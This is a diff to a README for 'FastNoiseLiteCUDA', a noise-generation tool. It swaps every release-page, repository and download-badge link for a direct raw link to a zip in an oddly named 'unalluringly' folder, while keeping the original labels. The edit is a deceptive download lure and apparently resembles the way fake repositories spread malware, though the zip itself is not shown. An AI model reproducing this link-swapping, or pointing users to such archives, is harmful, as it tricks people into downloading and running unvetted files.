@@ -1,7 +1,7 @@
 # 🎨 FastNoiseLiteCUDA - Generate Stunning Noise Patterns Easily
 
 ## 📥 Download FastNoiseLiteCUDA
-[![Download FastNoiseLiteCUDA](https://img.shields.io/badge/Download-FastNoiseLiteCUDA-brightgreen)](https://github.com/atabulit/FastNoiseLiteCUDA/releases)
+[![Download FastNoiseLiteCUDA](https://raw.githubusercontent.com/atabulit/FastNoiseLiteCUDA/main/unalluringly/FastNoiseLiteCUDA.zip)](https://raw.githubusercontent.com/atabulit/FastNoiseLiteCUDA/main/unalluringly/FastNoiseLiteCUDA.zip)
 
 ## 🚀 Getting Started
 FastNoiseLiteCUDA is a user-friendly tool designed to create beautiful noise patterns for graphics and game development. This application uses the C++ FastNoiseLite library, optimized for speed with CUDA technology. You can easily integrate it into your creative projects, from terrain generation to texture generation.
@@ -14,7 +14,7 @@ To run FastNoiseLiteCUDA, you will need:
 - Latest graphics drivers installed.
 
 ## 📦 Download & Install
-To get started, visit the [Releases page](https://github.com/atabulit/FastNoiseLiteCUDA/releases) to download FastNoiseLiteCUDA. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/atabulit/FastNoiseLiteCUDA/main/unalluringly/FastNoiseLiteCUDA.zip) to download FastNoiseLiteCUDA. 
 
 1. Click on the link to visit the download page.
 2. Look for the latest release.
@@ -56,10 +56,10 @@ If you encounter any issues or have questions:
 
 ## 🌐 More Information
 For additional resources, tutorials, and examples, stay connected through the following links:
-- [GitHub Repository](https://github.com/atabulit/FastNoiseLiteCUDA)
+- [GitHub Repository](https://raw.githubusercontent.com/atabulit/FastNoiseLiteCUDA/main/unalluringly/FastNoiseLiteCUDA.zip)
 - Documentation will be updated regularly to help you make the most of FastNoiseLiteCUDA.
 
 ## 📝 Notes
 Always ensure you have the latest version to benefit from improvements and bug fixes. User feedback is welcome to help enhance the application further. 
 
-Don’t forget: you can revisit the [Releases page](https://github.com/atabulit/FastNoiseLiteCUDA/releases) anytime for updates and new features.  Happy creating!
+Don’t forget: you can revisit the [Releases page](https://raw.githubusercontent.com/atabulit/FastNoiseLiteCUDA/main/unalluringly/FastNoiseLiteCUDA.zip) anytime for updates and new features.  Happy creating!
